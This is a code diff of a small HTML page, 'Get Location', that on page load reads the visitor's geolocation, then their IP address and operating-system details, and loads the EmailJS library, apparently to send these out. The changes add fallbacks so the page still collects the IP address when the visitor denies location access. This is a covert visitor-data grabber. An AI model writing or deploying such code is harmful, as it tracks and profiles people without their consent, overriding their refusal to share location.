@@ -1,26 +1,30 @@
 <!DOCTYPE html>
 <html>
+
 <head>
     <title>Get Location</title>
 </head>
+
 <body>
     <h1>Get Location</h1>
 
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        document.addEventListener("DOMContentLoaded", function() {
+        document.addEventListener("DOMContentLoaded", function () {
             getLocation();
         });
 
         function getLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
+                navigator.geolocation.getCurrentPosition(function (position) {
                     getIPAddress(position.coords.latitude, position.coords.longitude);
-                }, function(error) {
+                }, function (error) {
                     console.error("Error getting location:", error.message);
+                    getIPAddress(null, null); // Pass null coordinates if geolocation is denied
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
+                getIPAddress(null, null); // Pass null coordinates if geolocation is not supported
             }
         }
 
@@ -33,7 +37,7 @@
                 })
                 .catch(error => {
                     console.error('Error getting IP address:', error);
-                    getOSInformation(latitude, longitude, null);
+                    getOSInformation(latitude, longitude, null); // Pass null IP address if IP address cannot be retrieved
                 });
         }
 
@@ -56,4 +60,5 @@
         }
     </script>
 </body>
+
 </html>
